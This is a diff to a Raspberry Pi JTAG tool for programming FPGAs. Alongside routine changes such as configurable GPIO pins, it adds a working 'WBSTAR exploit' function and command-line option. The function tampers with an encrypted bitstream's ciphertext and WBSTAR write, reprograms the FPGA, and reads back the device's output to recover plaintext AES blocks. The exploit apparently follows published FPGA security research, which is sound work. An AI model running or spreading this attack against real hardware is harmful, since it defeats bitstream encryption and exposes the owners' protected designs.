@@ -11,6 +11,7 @@ import time
 import subprocess
 import logging
 import sys
+import binascii
 
 from enum import Enum
 
@@ -25,6 +26,11 @@ except:
 from gpioffi.lib import jtag_pins
 from gpioffi.lib import jtag_prog
 
+TCK_pin = 4
+TMS_pin = 17
+TDI_pin = 27  # TDI on FPGA, out for this script
+TDO_pin = 22  # TDO on FPGA, in for this script
+
 class JtagLeg(Enum):
     DR = 0
     IR = 1
@@ -33,6 +39,8 @@ class JtagLeg(Enum):
     ID = 4 # idle in run-test
     IRP = 5  # IR with pause
     IRD = 6  # transition to IR directly
+    DRC = 7  # DR for config: MSB-to-LSB order, and use fast protocols
+    DRR = 8  # DR for recovery: print out the value returned in non-debug modes
 
 class JtagState(Enum):
     TEST_LOGIC_RESET = 0
@@ -51,16 +59,11 @@ jtag_legs = []
 tdo_vect = ''
 jtag_results = []
 do_pause = False
-in_cfg = False
 gpio_pointer = 0
 keepalive = []
 compat = False
-
-TCK_pin = 4
-TMS_pin = 17
-TDI_pin = 27  # TDI on FPGA, out for this script
-TDO_pin = 22  # TDO on FPGA, in for this script
-
+readout = False
+readdata = 0
 
 def phy_sync(tdi, tms):
     global TCK_pin, TMS_pin, TDI_pin, TDO_pin
@@ -136,17 +139,11 @@ def decode_ir(ir):
         return ''  # unknown just leave blank for now
 
 def debug_spew(cur_leg):
-    global in_cfg
     
-    if len(cur_leg[1]) < 384:
+    if cur_leg[0] != JtagLeg.DRC:
         logging.debug("start: %s (%s) / %s", str(cur_leg), str(decode_ir(int(cur_leg[1],2))), str(cur_leg[2]) )
-        if decode_ir(int(cur_leg[1],2)) == 'CFG_IN' or decode_ir(int(cur_leg[1],2)) == 'CFG_OUT':
-            in_cfg = True
-        else:
-            if cur_leg[0] != JtagLeg.DR:
-                in_cfg = False
     else:
-        logging.debug("start: %s large data of length %s", cur_leg[0], str(len(cur_leg[1])))
+        logging.debug("start: %s config data of length %s", cur_leg[0], str(len(cur_leg[1])))
 
 # take a trace and attempt to extract IR, DR values
 # assume: at the start of each 'trace' we are coming from TEST-LOGIC-RESET
@@ -157,11 +154,12 @@ def jtag_step():
     global jtag_results
     global tdo_vect
     global do_pause
-    global in_cfg
     global TCK_pin, TMS_pin, TDI_pin, TDO_pin
     global gpio_pointer
     global keepalive
     global compat
+    global readout
+    global readdata
 
     # logging.debug(state)
     if state == JtagState.TEST_LOGIC_RESET:
@@ -171,8 +169,12 @@ def jtag_step():
     elif state == JtagState.RUN_TEST_IDLE:
         if len(cur_leg):
             # logging.debug(cur_leg[0])
-            if cur_leg[0] == JtagLeg.DR:
+            if cur_leg[0] == JtagLeg.DR or cur_leg[0] == JtagLeg.DRC or cur_leg[0] == JtagLeg.DRR:
                 phy_sync(0, 1)
+                if cur_leg[0] == JtagLeg.DRR:
+                    readout = True
+                else:
+                    readout = False
                 state = JtagState.SELECT_SCAN
             elif cur_leg[0] == JtagLeg.IR or cur_leg[0] == JtagLeg.IRD:
                 phy_sync(0, 1)
@@ -198,9 +200,9 @@ def jtag_step():
                 phy_sync(0, 1)
                 phy_sync(0, 1)
                 phy_sync(0, 1)
-                state = JtagState.TEST_LOGIC_RESET
                 cur_leg = jtag_legs.pop(0)
                 debug_spew(cur_leg)
+                state = JtagState.TEST_LOGIC_RESET
             elif cur_leg[0] == JtagLeg.DL:
                 time.sleep(0.005) # 5ms delay
                 cur_leg = jtag_legs.pop(0)
@@ -227,7 +229,7 @@ def jtag_step():
         state = JtagState.SHIFT
 
     elif state == JtagState.SHIFT:
-        if in_cfg and cur_leg[0] == JtagLeg.DR:
+        if cur_leg[0] == JtagLeg.DRC:
             if compat:
                 for bit in cur_leg[1][:-1]:
                    if bit == '1':
@@ -242,6 +244,7 @@ def jtag_step():
                 ffistr = ffi.new("char[]", bytestr)
                 keepalive.append(ffistr) # need to make sure the lifetime of the string is long enough for the call
                 jtag_prog(ffistr, gpio_pointer)
+                GPIO.output( TCK_pin, 0 ) # restore this to 0, as jtag_prog() leaves TCK high when done
                 
             state = JtagState.SHIFT
 
@@ -250,7 +253,7 @@ def jtag_step():
             else:
                 tdi = 0
             cur_leg = ''
-            phy_sync(tdi, 0) # skip recording the output
+            phy_sync(tdi, 1) # skip recording the output
             tdo_vect = '0'
             state = JtagState.EXIT1
             logging.debug('leaving config')
@@ -304,6 +307,10 @@ def jtag_step():
         phy_sync(0, 0)        
         jtag_results.append(int(tdo_vect, 2)) # interpret the vector and save it
         logging.debug("result: %s", str(hex(int(tdo_vect, 2))) )
+        if readout:
+            #print('readout: 0x{:08x}'.format( int(tdo_vect, 2) ) )
+            readdata = int(tdo_vect, 2)
+            readout = False
         tdo_vect = ''
 
         state = JtagState.RUN_TEST_IDLE
@@ -367,11 +374,153 @@ def do_bitstream(ifile):
         jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
         jtag_legs.append([JtagLeg.RS, '0', 'reset'])
         jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
-        jtag_legs.append([JtagLeg.DR, config_data, 'config_data'])
+        jtag_legs.append([JtagLeg.DRC, config_data, 'config_data'])
         jtag_legs.append([JtagLeg.RS, '0', 'reset'])
         jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
         jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
 
+"""
+Reverse the order of bits in a word that is bitwidth bits wide
+"""
+def bitflip(data_block, bitwidth=32):
+    if bitwidth == 0:
+        return data_block
+
+    bytewidth = bitwidth // 8
+    bitswapped = bytearray()
+
+    i = 0
+    while i < len(data_block):
+        data = int.from_bytes(data_block[i:i+bytewidth], byteorder='big', signed=False)
+        b = '{:0{width}b}'.format(data, width=bitwidth)
+        bitswapped.extend(int(b[::-1], 2).to_bytes(bytewidth, byteorder='big'))
+        i = i + bytewidth
+
+    return bytes(bitswapped)
+
+
+def do_wbstar(ifile, offset):
+    global readdata
+    
+    if offset < 1:
+        print("Offset {} is too small. Must be greater than 0.".format(offset))
+        exit(0)
+        
+    with open(ifile, "rb") as f:
+        binfile = bytearray(f.read())
+    
+        # search for structure
+        # 0x3001_6004 -> specifies the CBC key
+        # 4 words of CBC IV
+        # 0x3003_4001 -> ciphertext len
+        # 1 word of ciphertext len
+        # then ciphertext
+
+        position = 0
+        iv_pos = 0
+        sync_pos = 0
+        while position < len(binfile):
+            cwd = int.from_bytes(binfile[position:position+4], 'big')
+            if cwd == 0x30016004:
+                iv_pos = position+4
+            if cwd == 0x30034001:
+                break
+            if cwd == 0xaa995566:
+                sync_pos = position
+            position = position + 1
+
+        position = position + 4
+
+        ciphertext_len = 4* int.from_bytes(binfile[position:position+4], 'big')
+        logging.debug("original ciphertext len: %d", ciphertext_len)
+
+        # patch a new length in, which is 0x98
+        binfile[position+0] = 0x0
+        binfile[position+1] = 0x0
+        binfile[position+2] = 0x0
+        binfile[position+3] = 0x98
+        
+        cipherstart = position + 4
+
+        # we don't use this, but it's neat to see.
+        iv_bytes = bitflip(binfile[iv_pos : iv_pos+0x10])  # note that the IV is embedded in the file
+        logging.debug("recovered iv: %s", binascii.hexlify(iv_bytes))
+
+        recovered = [0,0,0,0]
+        block = [0,0,0,0]
+
+        for word_index in range(0, 4):
+           # copy attack area as template
+           attack_area = binfile[sync_pos:cipherstart + 0x98*4] # from HMAC header to end of "configuration footer"
+           attack_cipherstart = cipherstart - sync_pos # subtract out the sync_pos offset
+
+           # mutate the WBSTAR write length
+           # 0xD selects the third word in the AES block; 0x1 is there originally, so much XOR that out
+           wbstar_patch = 0xd - word_index
+           attack_area[attack_cipherstart + 0x3b] = attack_area[attack_cipherstart + 0x3b] ^ wbstar_patch ^ 0x1
+
+           # copy in the IV + target block
+           dest = attack_cipherstart + 6*16  # 6x 16-byte AES blocks
+           for source in range( sync_pos + attack_cipherstart + (offset-1)*16,
+                                sync_pos + attack_cipherstart + (offset+1)*16 ):
+               attack_area[dest] = binfile[source]
+               dest = dest + 1
+
+           # patch in 0x2000_0000 (NOP) command over words as they are decrypted to prevent errant commands to fabric
+           for patch in range(0, word_index):
+               attack_area[attack_cipherstart + 0x6c - 4*patch] ^= (((recovered[3-patch] >> 24) & 0xff) ^ 0x20)
+               attack_area[attack_cipherstart + 0x6d - 4*patch] ^= (((recovered[3-patch] >> 16) & 0xff) ^ 0x00)
+               attack_area[attack_cipherstart + 0x6e - 4*patch] ^= (((recovered[3-patch] >>  8) & 0xff) ^ 0x00)
+               attack_area[attack_cipherstart + 0x6f - 4*patch] ^= (((recovered[3-patch] >>  0) & 0xff) ^ 0x00)
+
+           # attack_area now contains the data to configure
+           debug = False
+           if debug:
+               i = 0
+               for b in attack_area:
+                   if i % 32 == 0:
+                       print(" ")
+                   i = i + 1
+                   print("{:02x} ".format(b), end='')
+               print(" ")
+               with open("check{}.bin".format(word_index), "wb") as check:
+                   check.write(attack_area)
+           # run the attack
+           attack_bits = bin(int.from_bytes(attack_area, byteorder='big'))[2:]
+           jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
+           jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
+           jtag_legs.append([JtagLeg.IR, '001011', 'jprogram'])
+           jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
+           jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
+           jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+           jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
+           jtag_legs.append([JtagLeg.DRC, attack_bits, 'attack_data'])
+           jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+           jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
+           jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
+
+           while len(jtag_legs):
+              jtag_next()
+
+           # now perform the readout
+           jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+           jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
+           jtag_legs.append([JtagLeg.DRC, bin(0xaa99556620000000280200012000000020000000)[2:], 'readout_command'])
+           # command as from Ender paper
+           #jtag_legs.append([JtagLeg.DRC, bin(0xffffffffffffffffffffffffffffffffffffffffffffffff000000bb11220044ffffffffffffffffaa9955662000000030008001000000042000000020000000200000002802000120000000200000002000000020000000)[2:], 'readout_command'])
+           jtag_legs.append([JtagLeg.IR, '000100', 'cfg_out'])
+           jtag_legs.append([JtagLeg.DRR, '00000000000000000000000000000000', 'readout'])
+           jtag_legs.append([JtagLeg.RS, '0', 'reset'])
+           jtag_legs.append([JtagLeg.IR, '010100', 'noop'])
+
+           while len(jtag_legs):
+              jtag_next()
+
+           logging.debug("Recovered word: 0x%s", hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')))
+           recovered[3-word_index] = readdata
+           block[3-word_index] = int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')
+
+        print('AES block {} is 0x{:08x}{:08x}{:08x}{:08x}'.format(offset, block[0], block[1], block[2], block[3]))
         
         
 def main():
@@ -388,10 +537,25 @@ def main():
         "-b", "--bitstream", default=False, action="store_true", help="input file is a bitstream, not a JTAG command set"
     )
     parser.add_argument(
+        "-w", "--wbstar", help="Decode one AES block  using WBSTAR exploit. Offset is specified in units of 128-bit blocks.", type=int
+    )
+    parser.add_argument(
         "-c", "--compat", default=False, action="store_true", help="Use compatibility mode (warning: about 100x slower than FFI)"
     )
     parser.add_argument(
         "-d", "--debug", help="turn on debugging spew", default=False, action="store_true"
+    )
+    parser.add_argument(
+        '--tdi', type=int, help="Specify TDI GPIO. Defaults to 27", default=27
+    )
+    parser.add_argument(
+        '--tdo', type=int, help="Specify TDO GPIO. Defaults to 22", default=22
+    )
+    parser.add_argument(
+        '--tms', type=int, help="Specify TMS GPIO. Defaults to 17", default=17
+    )
+    parser.add_argument(
+        '--tck', type=int, help="Specify TCK GPIO. Defaults to 4", default=4
     )
     args = parser.parse_args()
     if args.debug:
@@ -399,6 +563,24 @@ def main():
                 
     ifile = args.file
     compat = args.compat
+
+    if TCK_pin != args.tck:
+        compat = True
+        TCK_pin = args.tck
+    if TDI_pin != args.tdi:
+        compat = True
+        TDI_pin = args.tdi
+    if TDO_pin != args.tdo:
+        compat = True
+        TDO_pin = args.tdo
+    if TMS_pin != args.tms:
+        compat = True
+        TMS_pin = args.tms
+
+    if compat == True and args.compat == False:
+        print("Compatibility mode triggered because one of tck/tdi/tdo/tms pins do not match the CFFI bindings")
+        print("To fix this, edit gpio-ffi.c and change the #define's to match your bindings, and update the ")
+        print("global defaults to the pins in this file, specified just after the imports.")
 
     rev = GPIO.RPI_INFO
     if rev['P1_REVISION'] == 1:
@@ -413,6 +595,8 @@ def main():
 
     if args.bitstream:
         print('Programming .bin file to FPGA:', ifile)
+    elif args.wbstar:
+        print('Decrypting AES blocks from file: ', ifile)
     else:
         print('Executing .jtg command file:', ifile)
         
@@ -421,6 +605,11 @@ def main():
     GPIO.setup((TCK_pin, TMS_pin, TDI_pin), GPIO.OUT)
     GPIO.setup(TDO_pin, GPIO.IN)
 
+    if args.wbstar != None:
+        do_wbstar(ifile, args.wbstar)
+        GPIO.cleanup()
+        exit(0)
+        
     if args.bitstream:
         do_bitstream(ifile)
         while len(jtag_legs):
@@ -451,7 +640,7 @@ def main():
                 value = int(row[2])
 
             if (chain != 'dr') & (chain != 'ir') & (chain != 'rs') & (chain != 'dl') & \
-               (chain != 'id') & (chain != 'irp') & (chain != 'ird'):
+               (chain != 'id') & (chain != 'irp') & (chain != 'ird') & (chain != 'drc') & (chain != 'drr'):
                 print('unknown chain type ', chain, ' aborting!')
                 GPIO.cleanup()
                 exit(1)
@@ -467,6 +656,10 @@ def main():
             else:
                 if chain == 'dr':
                     code = JtagLeg.DR
+                elif chain == 'drc':
+                    code = JtagLeg.DRC
+                elif chain == 'drr':
+                    code = JtagLeg.DRR
                 elif chain == 'ir':
                     code = JtagLeg.IR
                 elif chain == 'ird':
